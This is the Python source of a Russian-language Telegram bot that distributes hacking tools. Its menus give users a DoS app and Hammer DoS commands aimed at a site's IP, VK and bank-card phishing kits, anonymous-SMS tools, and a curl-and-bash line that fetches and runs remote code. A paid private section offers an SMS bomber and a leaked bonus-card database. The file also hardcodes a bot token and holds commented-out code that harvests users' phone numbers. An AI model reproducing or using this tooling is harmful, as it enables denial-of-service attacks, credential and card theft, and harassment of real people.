import sqlite3
import re
import aiogram.utils.markdown as fmt
import random
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.utils.exceptions import MessageNotModified
from contextlib import suppress
from sys import exit
import logging
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.types import KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import StatesGroup, State


class admad(StatesGroup):
    ad = State()


class id(StatesGroup):
    id_usr = State()


bot = Bot(token="5817699100:AAFgFPm5EJ0jWXrd5f_d3liYR3_oS6AEeFM")
dp = Dispatcher(bot, storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

button_helpp = InlineKeyboardButton('–ü–æ–º–æ—â—å', callback_data='help')
button2 = InlineKeyboardButton('üß®–°–ø–∞–º', callback_data='spam')
button3 = InlineKeyboardButton('üë•–®–∏—Ñ—Ä', callback_data='shifr')
button4 = InlineKeyboardButton('‚öî–î–æ—Å –∞—Ç–∞–∫–∞', callback_data='dos')
button_termux_app = InlineKeyboardButton('–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Ç–µ—Ä–º—É–∫—Å', callback_data='termux_app')
button5 = InlineKeyboardButton('‚öî–î–æ—Å –∞—Ç–∞–∫–∞', callback_data='Dostermux')
button6 = InlineKeyboardButton('üíÄ–•aker', callback_data='xaker')
button7 = InlineKeyboardButton('üë•–ê–Ω–æ–Ω–∏–º–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è', callback_data='anon_sms')
button8 = InlineKeyboardButton('üñá–§–∏—à–∏–Ω–≥ –≤–∫', callback_data='phishing_vk')
button9 = InlineKeyboardButton('üñá–§–∏—à–∏–Ω–≥ –±–∞–Ω–∫–æ–≤—Å–∫–∏—Ö –∫–∞—Ä—Ç', callback_data='phishing_ss')
button_fortermux = InlineKeyboardButton('–î–ª—è —Ç–µ—Ä–º—É–∫—Å', callback_data='for_termux')
button_forlinux = InlineKeyboardButton('–î–ª—è –ª–∏–Ω—É–∫—Å', callback_data='for_linux')
button_back1 = InlineKeyboardButton('üîô–ù–∞–∑–∞–¥', callback_data='back1')
button_termux = InlineKeyboardButton('ü¶†–ú–µ–Ω—é —Ç–µ—Ä–º—É–∫—Å', callback_data='termux')
button_back = InlineKeyboardButton('üîô–ù–∞–∑–∞–¥', callback_data='back')

button_sell = InlineKeyboardButton('ü•ù–ü–æ–¥–¥–µ—Ä–∂–∞—Ç—å', callback_data='sell')

play_menu = InlineKeyboardButton('‚öΩÔ∏èüé±üèÄ–ò–≥—Ä–æ–≤–æ–µ –º–µ–Ω—é', callback_data='play_menu')

helpp = InlineKeyboardMarkup()
helpp.add(button_helpp)

markup3 = InlineKeyboardMarkup(row_width=2).add(button2).add(button3).add(button4).add(button_termux_app).add(
    button_termux).add(play_menu).add(button_sell)

markup4 = InlineKeyboardMarkup(row_width=2).add(button5).add(button6).add(button7).add(button8).add(button9).add(
    button_back)

markup5 = InlineKeyboardMarkup(row_width=2).add(button_fortermux).add(button_forlinux).add(button_back1)

priv_1 = InlineKeyboardButton('18+', callback_data='1')

priv_2 = InlineKeyboardButton('–ù–∞–∫—Ä—É—Ç–∫–∞ –∏–Ω—Å—Ç—ã', callback_data='2')

priv_3 = InlineKeyboardButton('–¢–æ–ø –±–æ–º–±–µ—Ä', callback_data='3')

priv_4 = InlineKeyboardButton('–ë–∞–∑–∞ –±–æ–Ω—É—Å–Ω—ã—Ö –∫–∞—Ä—Ç 5-—á–∫–∏', callback_data='4')

priv_5 = InlineKeyboardButton('–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ç—Ä–∞—Ñ–∏–∫–∞ —á–µ—Ä–µ–∑ tor', callback_data='5')

exit_priv = InlineKeyboardButton('üîô–í—ã–•–æ–î', callback_data='exit')

markup_pivate = InlineKeyboardMarkup().add(priv_1).add(priv_2).add(priv_3).add(priv_4).add(priv_5).add(exit_priv)

my = 5689226201

with sqlite3.connect("database.db") as conn:
    cursor = conn.cursor()
    cursor.execute("""
  CREATE TABLE IF NOT EXISTS users
  (user INTEGER, name VARCHAR, priv VARCHAR)
  """)


@dp.message_handler(commands="priv")
async def vhod_2(message: types.Message):
    chat_id = message.from_user.id
    if chat_id == my:
        await message.answer("–¢—ã –í–æ–®—ë–õ –≤ –ü—Ä–ò–≤–ê—Ç–ù—ã–ô —Ä–ê–∑–î–µ–ª!", reply_markup=markup_pivate)
    else:
        await message.answer("–ü—Ä–∏–≤–∞—Ç–∫–∞ —Å—Ç–æ–∏—Ç 30 —Ä—É–±–ª–µ–π\n–ü–∏—Å–∞—Ç—å –≤ –ª–∏—á–∫—É: @Kiberhack")
        await bot.send_message(my, "–≠—Ç–æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—ã—Ç–∞–ª—Å—è –≤–æ–π—Ç–∏ –≤ –ø—Ä–∏–≤–∞—Ç–∫—É: " + str(chat_id))
        username = message.from_user.username
        await bot.send_message(my, "–≠—Ç–æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—ã—Ç–∞–ª—Å—è –≤–æ–π—Ç–∏ –≤ –ø—Ä–∏–≤–∞—Ç–∫—É: @" + str(username))
        first_name = message.from_user.first_name
        await bot.send_message(my, "–≠—Ç–æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—ã—Ç–∞–ª—Å—è –≤–æ–π—Ç–∏ –≤ –ø—Ä–∏–≤–∞—Ç–∫—É: " + str(first_name))
        last_name = message.from_user.last_name
        await bot.send_message(my, "–≠—Ç–æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—ã—Ç–∞–ª—Å—è –≤–æ–π—Ç–∏ –≤ –ø—Ä–∏–≤–∞—Ç–∫—É: " + str(last_name))


# @dp.message_handler(commands="number")
# async def cmd_number(message: types.Message):
#    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
#   keyboard.add(types.KeyboardButton(text="–¢—ã–∫ —Å—é–¥–∞!", request_contact=True))
#  await message.answer("–°–∫–∞–∂–∏—Ç–µ –Ω–∞–º —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:", reply_markup=keyboard)


# @dp.message_handler(content_types=['contact'])
# async def send_message(message: types.Message):
#   if message.contact is not None:
#      keyboard2 = types.ReplyKeyboardRemove()
#     await message.answer("–í—ã —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ —Å–≤–æ–π –Ω–æ–º–µ—Ä", reply_markup=keyboard2)
#    await message.answer("–í–∞–º –Ω–∞–ø–∏—à–µ—Ç: @Programming_hacking_1.")
#   await message.answer("–ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –≤–∞—Å –¥–æ–±–∞–≤—è—Ç –≤ –ø—Ä–∏–≤–∞—Ç–∫—É –±–æ—Ç–∞.")
#  contact = message.contact
# print(contact.first_name)
# print(contact.last_name)
# print("–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: +", contact.phone_number)
# print("id :", message.from_user.id)
# chat_id = -1001774805952
#
# await bot.send_message(chat_id, "–ï—â–µ –æ–¥–∏–Ω –ª–æ—à–æ–∫ —Å–∫–∏–Ω—É–ª —Å–≤–æ–π –Ω–æ–º–µ—Ä:")
# await bot.send_message(chat_id, "#num\n+"+contact.phone_number)
# await bot.send_message(chat_id, "#id\n" +str(message.from_user.id))
# await bot.send_message(my, "#num\n+"+contact.phone_number)
# await bot.send_message(my, "#id\n" +str(message.from_user.id))
# else:
#   await message.answer("–í—ã —Å–∫—Ä—ã–≤–∞–µ—Ç–µ —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –º—ã –Ω–µ –º–æ–∂–µ–º –¥–æ–±–∞–≤–∏—Ç—å –≤–∞—Å!")


@dp.callback_query_handler(text='1')
async def priv1(callback: types.CallbackQuery):
    await callback.message.edit_text("https://drive.google.com/file/d/1kxqBCmITDcc2vx2Ej2eJpKrzmi5gZcVY/view?usp"
                                     "=sharing",
                                     reply_markup=markup_pivate)


@dp.callback_query_handler(text='2')
async def priv2(callback: types.CallbackQuery):
    await callback.message.edit_text("https://drive.google.com/file/d/1unDZGBqUD89GoksAicWXl5FWIkudU73p/view?usp"
                                     "=sharing",
                                     reply_markup=markup_pivate)


@dp.callback_query_handler(text='3')
async def priv3(callback: types.CallbackQuery):
    await callback.message.edit_text("https://drive.google.com/file/d/1Agv-ESyGB6g4fZFlg-O_CGoFKkHlIDhE/view?usp"
                                     "=sharing",
                                     reply_markup=markup_pivate)


@dp.callback_query_handler(text='4')
async def priv4(callback: types.CallbackQuery):
    await callback.message.edit_text("https://drive.google.com/file/d/12TP3gm-MhWBXTgZZHTsXyDMEu-I5A6F0/view?usp"
                                     "=sharing",
                                     reply_markup=markup_pivate)


@dp.callback_query_handler(text='5')
async def priv5(callback: types.CallbackQuery):
    await callback.message.edit_text("–£—Å—Ç–∞–Ω–æ–≤–∫–∞:\ngit clone https://github.com/Und3rf10w/kali-anonsurf\ncd "
                                     "kali-anonsurf/\nsudo ./installer.sh\n\n–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:\nanonsurf --help",
                                     reply_markup=markup_pivate)


@dp.callback_query_handler(text='exit')
async def exit(callback: types.CallbackQuery):
    await callback.message.edit_text("–í—ã –≤—ã—à–ª–∏ –∏–∑ –ø—Ä–∏–≤–∞—Ç–∞!")
    await callback.message.answer("–í—Å–µ –∫–æ–º–∞–Ω–¥—ã:\n–ü–æ –≤—Å–µ–º –≤–æ–ø—Ä–æ—Å–∞–º –æ–±—Ä–∞—â–∞—Ç—å—Å—è –∫ @Kiberhack .",
                                  reply_markup=markup3)


#####################################################################################################
####################            –ö–û–î –î–õ–Ø –ê–î–ú–ò–ù–ê        ###############################################
#####################################################################################################


admin_users = InlineKeyboardButton('–í—Å–µ–≥–æ —é–∑–µ—Ä–æ–≤', callback_data='allusradm')

admin_all_usr = InlineKeyboardButton('–í—ã–≤–µ—Å—Ç–∏ –≤—Å–µ—Ö', callback_data='allusers')

adm_send = InlineKeyboardButton('üì® –†–∞—Å—Å—ã–ª–∫–∞', callback_data='sendmsgadm')

adm_send_smbd = InlineKeyboardButton('üì® –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–Ω-–Ω–æ', callback_data='sendsmbd')

adm_exit = InlineKeyboardButton('–í—ã—Ö–æ–¥', callback_data='exitadm')

admin_m = InlineKeyboardMarkup().add(admin_users).add(admin_all_usr).add(adm_send).add(adm_send_smbd).add(adm_exit)


##############–ü–ê–°–•–ê–õ–ö–ê########
@dp.message_handler(commands="secret")
async def secret(message: types.message):
    await message.answer_document(open('GIF.gif.mp4', 'rb'))


@dp.message_handler(content_types=['text'])
async def get_text(message: types.message):
    chat_id = message.from_user.id
    if message.text == '/admin':
        if chat_id == my:
            await message.answer("–ü—Ä–∏–≤—ç—Ç, —Å–æ–∑–¥–∞—Ç—ç–ª—å", reply_markup=admin_m)
        else:
            await message.answer("–ö—É–¥–∞ –º—ã –ª–µ–∑–µ–º?ü§¨")
    if message.text == '/start':
        await message.answer("‚ÄºÔ∏è–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ 2.0‚ÄºÔ∏è")
        await message.answer("–ü—Ä–∏–≤–µ—Ç!", reply_markup=helpp)
        cursor.execute("select * from users where user = ?", (message.from_user.id,))
        usr = cursor.fetchone()
        no = "no"
        if not usr:
            cursor.execute("INSERT INTO users values (:user, :name, :priv);",
                           {'user': message.from_user.id,
                            'name': message.from_user.username,
                            'priv': no})
            conn.commit()
    if message.text == '–ò–¥–∏ –Ω–∞—Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–ò–¥–∏ –Ω–∞ —Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–∏–¥–∏ –Ω–∞ —Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–∏–¥–∏ –Ω–∞—Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–ü–æ—à—ë–ª –Ω–∞ —Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–ü–æ—à—ë–ª –Ω–∞—Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–ü–æ—à–µ–ª –Ω–∞ —Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–ü–æ—à–µ–ª –Ω–∞—Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–ø–æ—à—ë–ª –Ω–∞ —Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–ø–æ—à—ë–ª –Ω–∞ —Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–ø–æ—à—ë–ª –Ω–∞ —Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')
    if message.text == '–ø–æ—à—ë–ª –Ω–∞ —Ö—É–π':
        await message.answer('–°–∞–º –Ω–∞—Ö—É–π –∏–¥–∏')


allus = cursor.execute('SELECT Count(*) FROM users').fetchone()[0]


@dp.callback_query_handler(text='allusradm')
async def allusradm(callback: types.CallbackQuery):
    global allus
    await callback.message.edit_text(allus, reply_markup=admin_m)


@dp.callback_query_handler(text='allusers')
async def allusers(callback: types.CallbackQuery):
    global allus
    await callback.message.edit_text("–û–±—â–µ–µ —á–∏—Å–ª–æ: " + str(allus))
    await callback.message.answer_document(open('database.db', 'rb'))
    await callback.message.answer("„Ö§„Ö§", reply_markup=admin_m)


@dp.callback_query_handler(text='sendmsgadm')
async def sendmsgadm(callback: types.CallbackQuery):
    await callback.message.answer('–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫c—Ç –æ–±—ä—è–≤–ª–µ–Ω–∏—è :')
    await admad.ad.set()


@dp.message_handler(state=admad.ad)
async def getcount(message: types.Message, state: FSMContext):
    ad = message.text
    await state.update_data(ad=ad)
    await state.finish()
    cursor.execute("SELECT user FROM users")
    userbase = []
    while True:
        row = cursor.fetchone()
        if row == None:
            break
        userbase.append(row)
    if len(userbase) > 1:
        for z in range(len(userbase)):
            await bot.send_message(userbase[z][0], text=f"‚ÄºÔ∏è\n{ad}")
    else:
        await bot.send_message(userbase, f"‚ÄºÔ∏è\n{ad}")
    await bot.send_message(message.from_user.id, text='–ì–æ—Ç–æ–≤–æ', reply_markup=admin_m)


@dp.callback_query_handler(text='sendsmbd')
async def sendsmbd(callback: types.CallbackQuery):
    await callback.message.answer("–í–≤–µ–¥–∏ id –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è :")
    await id.id_usr.set()


@dp.message_handler(state=id.id_usr)
async def send_by_id(message: types.Message, state: FSMContext):
    id = message.text
    await state.update_data(id_usr=id)
    await state.finish()
    await message.answer("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å : " + str(id))
    await bot.send_message(id,
                           "–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç @Kiberhack :\n–ê–¥–º–∏–Ω —Ö–æ—á–µ–Ω—å –ø–æ–≥–æ–≤–æ—Ä–∏—Ç—å —Å –≤–∞–º–∏. –ö–æ–≥–¥–∞ –≤–∞–º –±—É–¥–µ—Ç "
                           "—É–¥–æ–±–Ω–æ, –Ω–∞–ø–∏—à–∏—Ç–µ –∞–¥–º–∏–Ω—É.")
    await message.answer("–°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!")


@dp.callback_query_handler(text='exitadm')
async def exitadm(callback: types.CallbackQuery):
    await callback.message.answer("–î–æ–≤–∞–π –ø–æ–∫–∞", reply_markup=markup3)


#####################################################################################################
####################            –û–°–ù–û–í–ù–û–ô –ö–û–î        #################################################
#####################################################################################################


#############################################################################
#                                                                           #
#                   –ò–ì–†–û–í–û–ï –ú–ï–ù–Æ                                            #
#                                                                           #
#############################################################################


coin_p = InlineKeyboardButton('–û—Ä–µ–ª/–†–µ—à–∫–∞', callback_data='oreshka')

xo_play = InlineKeyboardButton('–ò–≥—Ä–∞—Ç—å –≤   ‚ùå‚≠ïÔ∏è(–ü–æ–∫–∞ –≤ —Ä–∞–∑—Ä–∞–±.)', callback_data='X0')

play_exit = InlineKeyboardButton('–í—ã–π—Ç–∏', callback_data='exit_play')

play_m = InlineKeyboardMarkup().add(coin_p).add(xo_play).add(play_exit)


@dp.callback_query_handler(text='play_menu')
async def play_menu(callback: types.CallbackQuery):
    await callback.message.edit_text("–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é –≤–∞—Å –≤ –∏–≥—Ä–æ–≤–æ–º –º–µ–Ω—é!", reply_markup=play_m)


@dp.callback_query_handler(text='oreshka')
async def oreshka(callback: types.CallbackQuery):
    coin = ["ü™ô–û—Ä—ë–ª!", "üí∞–†–µ—à–∫–∞!"]
    await callback.message.answer(random.choice(coin), reply_markup=play_m)


@dp.callback_query_handler(text='exit_play')
async def exit_play(callback: types.CallbackQuery):
    await callback.message.edit_text("–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é :", reply_markup=markup3)


#######################################################################################
#                       –û–°–ù–û–í–ù–û–ô –ö–û–î                        #
############################################################################################


@dp.callback_query_handler(text='help')
async def help(callback: types.CallbackQuery):
    await callback.message.edit_text("–í—Å–µ –∫–æ–º–∞–Ω–¥—ã:\n–ü–æ –≤—Å–µ–º –≤–æ–ø—Ä–æ—Å–∞–º –æ–±—Ä–∞—â–∞—Ç—å—Å—è –∫ @Kiberhack .",
                                     reply_markup=markup3)


@dp.callback_query_handler(text='spam')
async def send_file_2(callback: types.CallbackQuery):
    await callback.message.edit_text("–ü–æ–¥–æ–∂–¥–∏—Ç–µ, –±–æ—Ç –∑–∞–≥—Ä—É–∂–∞–µ—Ç —Ñ–∞–π–ª –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏...")
    await callback.message.answer_document(open('Clicker.apk', 'rb'))
    await callback.message.answer("„Ö§„Ö§", reply_markup=markup3)


@dp.callback_query_handler(text='shifr')
async def send_file_3(callback: types.CallbackQuery):
    await callback.message.edit_text("–ü–æ–¥–æ–∂–¥–∏—Ç–µ, –±–æ—Ç –∑–∞–≥—Ä—É–∂–∞–µ—Ç —Ñ–∞–π–ª –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏...")
    await callback.message.answer_document(open('Enigma.apk', 'rb'))
    await callback.message.answer("„Ö§„Ö§", reply_markup=markup3)


@dp.callback_query_handler(text='dos')
async def send_file_4(callback: types.CallbackQuery):
    await callback.message.edit_text("–ü–æ–¥–æ–∂–¥–∏—Ç–µ, –±–æ—Ç –∑–∞–≥—Ä—É–∂–∞–µ—Ç —Ñ–∞–π–ª –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏...")
    await callback.message.answer_document(open('Dos.apk', 'rb'))
    await callback.message.answer("–°–æ–≤–µ—Ç—É—é –∑–∞–ø—É—Å–∫–∞—Ç—å –Ω–∞ WIFI, –ª–∏–±–æ –º–æ–±. –∏–Ω—Ç–µ—Ä–Ω–µ—Ç(–±–µ–∑–ª–∏–º–∏—Ç), —Ç.–∫. —Ç—Ä–∞—Ñ–∏–∫ –æ–≥—Ä–æ–º–Ω—ã–π")
    await callback.message.answer_photo(open('photo.jpg', 'rb'))
    await callback.message.answer(
        "‚ÄºÔ∏è–î–∞–Ω–Ω—ã–π —Ñ–∞–π–ª –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω —Ç–æ–ª—å–∫–æ –≤ —Ü–µ–ª—è—Ö –æ–∑–Ω–∞–∫–æ–º–ª–µ–Ω–∏—è, —è –Ω–µ –Ω–µ—Å—É –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏ –∑–∞ –≤–∞—à–∏ –¥–µ–π—Å—Ç–≤–∏—è!",
        reply_markup=markup3)


@dp.callback_query_handler(text='termux_app')
async def send_file_5(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "https://drive.google.com/file/d/1MniyaCMT0vUh6UvxcXbyz4oqaSJqFH38/view?usp=sharing")
    await callback.message.answer("„Ö§„Ö§", reply_markup=markup3)


@dp.callback_query_handler(text='sell')
async def sell(callback: types.CallbackQuery):
    await callback.message.edit_text("–ü–æ–¥–¥–µ—Ä–∂–∞—Ç—å:\nhttps://yoomoney.ru/to/4100117639669170")
    await callback.message.answer("„Ö§„Ö§", reply_markup=markup3)


@dp.callback_query_handler(text='termux')
async def termux(callback: types.CallbackQuery):
    await callback.message.edit_text('–í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –º–µ–Ω—é termux', reply_markup=markup4)


@dp.callback_query_handler(text='Dostermux')
async def termux(callback: types.CallbackQuery):
    await callback.message.edit_text(
        'Dos\n\n$ apt update\n$ apt upgrade\n$ apt install python\n$ apt install git\n$ apt install dnsutils\n$ git '
        'clone https://github.com/rk1342k/Hammer\n$ cd Hammer\n$ python hammer.py -s (ip –∞–¥—Ä–µ—Å —Å–∞–π—Ç–∞ –±–µ–∑ —Å–∫–æ–±–æ–∫) -p('
        '–ø–æ—Ä—Ç –±–µ–∑ —Å–∫–æ–±–æ–∫) -t 135\n–∑–Ω–∞–∫ $ –∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –Ω–µ –Ω—É–∂–Ω–æ',
        reply_markup=markup4)


@dp.callback_query_handler(text='back')
async def back(callback: types.CallbackQuery):
    await callback.message.edit_text('–í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', reply_markup=markup3)


@dp.callback_query_handler(text='xaker')
async def xaker(callback: types.CallbackQuery):
    await callback.message.edit_text(
        '\n\n$ curl -LO kutt.it/txaker && bash txaker\n\n–ó–∞–ø—É—Å–∫ –∏–∑ –ª—é–±–æ–π –¥–∏—Ä—Ä–µ–∫—Ç–æ—Ä–∏–∏:\n$ xaker', reply_markup=markup4)


@dp.callback_query_handler(text='anon_sms')
async def anon_sms(callback: types.CallbackQuery):
    await callback.message.edit_text('–í—ã–±–µ—Ä–∏—Ç–µ:', reply_markup=markup5)


@dp.callback_query_handler(text='for_termux')
async def for_termux(callback: types.CallbackQuery):
    await callback.message.edit_text(
        'pkg install git\npkg install python\ngit clone https://github.com/HACK3RY2J/Anon-SMS.git\ncd Anon-SMS\nbash Run.sh')
    await callback.message.answer('–í—ã–±–µ—Ä–∏—Ç–µ:', reply_markup=markup5)


@dp.callback_query_handler(text='for_linux')
async def for_linux(callback: types.CallbackQuery):
    await callback.message.edit_text(
        'sudo apt install git\ngit clone https://github.com/HACK3RY2J/Anon-SMS.git\ncd Anon-SMS\nsudo bash Run.sh')
    await callback.message.answer('–í—ã–±–µ—Ä–∏—Ç–µ:', reply_markup=markup5)


@dp.callback_query_handler(text='phishing_vk')
async def phishing_vk(callback: types.CallbackQuery):
    await callback.message.edit_text(
        'git clone https://github.com/gasayminajj/robophish\ncd robophish\nbash robophish.sh',
        reply_markup=markup4)


@dp.callback_query_handler(text='phishing_ss')
async def phishing_ss(callback: types.CallbackQuery):
    await callback.message.edit_text(
        'apt install python3 git\ngit clone https://github.com/escdroid/cardesc.git\ncd cardesc\nchmod +x *\npip3 install -r requirements.txt\npython3 bank.py',
        reply_markup=markup4)


@dp.callback_query_handler(text='back1')
async def back1(callback: types.CallbackQuery):
    await callback.message.edit_text('–í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –º–µ–Ω—é —Ç–µ—Ä–º—É–∫—Å', reply_markup=markup4)


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
